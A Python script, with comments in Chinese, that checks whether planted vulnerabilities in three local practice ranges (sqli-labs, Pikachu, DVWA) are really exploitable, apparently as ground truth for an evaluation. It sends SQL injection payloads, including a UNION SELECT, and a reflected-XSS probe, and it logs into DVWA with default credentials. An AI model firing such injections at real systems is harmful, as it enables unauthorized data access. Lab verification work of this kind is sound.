"""验证三个靶场的漏洞**真实可利用**（不只是能访问）。

用途：在为其编写技能与验证判据之前，先确认每个靶场的植入漏洞确实存在，
并记录**客观真值**（哪个 payload 触发什么现象），供技能判据引用。

这是"靶场可达性检查"之上的第二层：`setup_ranges.py` 只证明服务在跑，
本脚本证明**漏洞在**。

用法::

    .venv/Scripts/python eval/ranges/probe_ranges.py
"""

from __future__ import annotations

import re
import sys

import httpx

BASE = "http://localhost"

_TOKEN_RE = re.compile(r"""name=["']user_token["']\s+value=["']([^"']+)["']""")


def _show(label: str, ok: bool, detail: str) -> None:
    print(f"  {'✓' if ok else '✗'} {label}")
    print(f"      {detail[:200]}")


def _sqli_login_name(text: str) -> str:
    """从 sqli-labs 回显里抽出登录名，用于差分比较。"""
    m = re.search(r"Your Login name\s*:\s*([^<\s]*)", text)
    return m.group(1) if m else ""


def probe_sqli_labs(c: httpx.Client) -> bool:
    """sqli-labs Less-1：GET 参数 id 存在字符型注入。

    **不用"看报错"作为判据**：该靶场的 `sql-connect.php` 里有
    `@error_reporting(0)`，SQL 报错被有意屏蔽，看报错会得出假阴性。
    改用**差分法**（正常 / 破坏 / 注释修复 / UNION 回显），不依赖报错显示。
    """
    print("\n[sqli-labs] Less-1 字符型注入（差分法，不依赖报错显示）")
    all_ok = True
    url = f"{BASE}/sqli-labs/Less-1/"

    base = c.get(url, params={"id": "1"})
    name_base = _sqli_login_name(base.text)
    ok = bool(name_base)
    _show(f"基线 id=1 → 回显登录名 {name_base!r}", ok, f"HTTP {base.status_code}")
    all_ok &= ok

    broken = c.get(url, params={"id": "1'"})
    name_broken = _sqli_login_name(broken.text)
    ok = name_broken != name_base
    _show(f"id=1' → 回显变化（{name_broken!r}），说明引号进入了 SQL",
          ok, "被破坏即证明参数未转义")
    all_ok &= ok

    fixed = c.get(url, params={"id": "1'-- -"})
    name_fixed = _sqli_login_name(fixed.text)
    ok = name_fixed == name_base
    _show(f"id=1'-- - → 回显恢复（{name_fixed!r}），注释符生效",
          ok, "证明破坏确实来自未转义的引号")
    all_ok &= ok

    uni = c.get(url, params={"id": "-1' UNION SELECT 1,2,3-- -"})
    ok = _sqli_login_name(uni.text) == "2"
    _show("UNION SELECT 1,2,3 → 回显位 2（可利用）", ok,
          "这是「注入可利用」的硬证据，而不只是「参数未转义」")
    all_ok &= ok

    return all_ok


def probe_pikachu(c: httpx.Client) -> bool:
    """Pikachu：数字型/字符型 SQL 注入、反射型 XSS。"""
    print("\n[Pikachu] 漏洞抽检")
    all_ok = True

    # 1) 字符型注入
    r = c.get(f"{BASE}/pikachu/vul/sqli/sqli_str.php",
              params={"name": "vince", "submit": "查询"})
    hit = "vince" in r.text
    _show("sqli_str 正常查询 name=vince", hit, f"HTTP {r.status_code} len={len(r.text)}")
    all_ok &= hit

    r = c.get(f"{BASE}/pikachu/vul/sqli/sqli_str.php",
              params={"name": "vince'", "submit": "查询"})
    # 精确判据：注入成功后回显区应出现异常/报错，而不是页面里任意 "error" 字样
    # （Pikachu 页面本身引用了大量 JS 资源，宽泛匹配会假阳性）
    err = bool(re.search(r"SQL syntax|mysql_fetch|Warning:\s*mysqli|You have an error",
                         r.text, re.I)) or ("vince" not in r.text and "查询失败" in r.text)
    _show("name=vince' 触发 SQL 异常", err,
          re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:150])
    all_ok &= err

    # 2) 反射型 XSS：探针串应原样回显
    probe = "hiive_probe_7f3a"
    r = c.get(f"{BASE}/pikachu/vul/xss/xss_reflected_get.php",
              params={"message": probe, "submit": "submit"})
    xss = probe in r.text
    _show("反射型 XSS 探针原样回显", xss, f"探针 {probe} {'出现' if xss else '未出现'}")
    all_ok &= xss

    return all_ok


def probe_dvwa(c: httpx.Client) -> tuple[bool, str]:
    """DVWA：需登录，且安全级别须为 low 才有漏洞。

    **DVWA 的 login.php 与 setup.php 都带 CSRF token**（`checkToken()`）：
    不带 token 直接 POST 会静默失败（返回 200 但未登录/未建库）。
    """
    print("\n[DVWA] 登录与安全级别")
    client = httpx.Client(timeout=60, follow_redirects=True)

    r = client.get(f"{BASE}/DVWA/login.php")
    m = _TOKEN_RE.search(r.text)
    if not m:
        _show("取登录 CSRF token", False, "login.php 未渲染 user_token")
        return False, ""
    token = m.group(1)

    r = client.post(f"{BASE}/DVWA/login.php",
                    data={"username": "admin", "password": "password",
                          "Login": "Login", "user_token": token})
    logged = "logout.php" in r.text or "logged in" in r.text.lower()
    _show("admin/password 登录（带 CSRF token）", logged,
          f"HTTP {r.status_code} len={len(r.text)}")
    if not logged:
        return False, ""

    # 切换安全级别为 low
    r = client.get(f"{BASE}/DVWA/security.php")
    level = ""
    m2 = re.search(r"value=[\"'](\w+)[\"'][^>]*selected", r.text)
    if m2:
        level = m2.group(1)
    _show(f"当前安全级别 = {level or '未知'}", level == "low",
          "impossible 级别下各模块不可利用")
    if level != "low":
        tok = _TOKEN_RE.search(r.text)
        data = {"security": "low", "seclev_submit": "Submit"}
        if tok:
            data["user_token"] = tok.group(1)
        client.post(f"{BASE}/DVWA/security.php", data=data)
        r = client.get(f"{BASE}/DVWA/security.php")
        m3 = re.search(r"value=[\"'](\w+)[\"'][^>]*selected", r.text)
        level = m3.group(1) if m3 else level
        print(f"      → 切换后级别 = {level}")

    # SQLi 模块：low 级别下 id 为数字型注入
    url = f"{BASE}/DVWA/vulnerabilities/sqli/"
    r1 = client.get(url, params={"id": "1", "Submit": "Submit"})
    n1 = _dvwa_surname(r1.text)
    r2 = client.get(url, params={"id": "1'", "Submit": "Submit"})
    n2 = _dvwa_surname(r2.text)
    injected = n1 != n2 or bool(re.search(r"SQL syntax|error", r2.text, re.I))
    _show(f"SQLi 模块 id=1 → {n1!r}；id=1' → {n2!r}（回显变化）",
          bool(n1) and injected, "low 级别下 id 未做数字校验")

    phpsessid = client.cookies.get("PHPSESSID") or ""
    return bool(n1) and level == "low", phpsessid


def _dvwa_surname(text: str) -> str:
    m = re.search(r"<pre>(.*?)</pre>", text, re.S)
    if m:
        return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", m.group(1))).strip()[:60]
    return ""


def main() -> int:
    print("=" * 74)
    print("靶场漏洞真实性验证（区分「能访问」与「有漏洞」）")
    print("=" * 74)
    with httpx.Client(timeout=60, follow_redirects=True) as c:
        a = probe_sqli_labs(c)
        b = probe_pikachu(c)
        d, sess = probe_dvwa(c)

    print("\n" + "=" * 74)
    print(f"sqli-labs: {'漏洞可验证 ✓' if a else '需检查 ✗'}")
    print(f"Pikachu  : {'漏洞可验证 ✓' if b else '需检查 ✗'}")
    print(f"DVWA     : {'漏洞可验证 ✓' if d else '需检查 ✗'}")
    if sess:
        print(f"DVWA 会话: PHPSESSID={sess[:12]}…（技能需先登录再打模块）")
    print("=" * 74)
    return 0 if (a and b and d) else 1


if __name__ == "__main__":
    raise SystemExit(main())
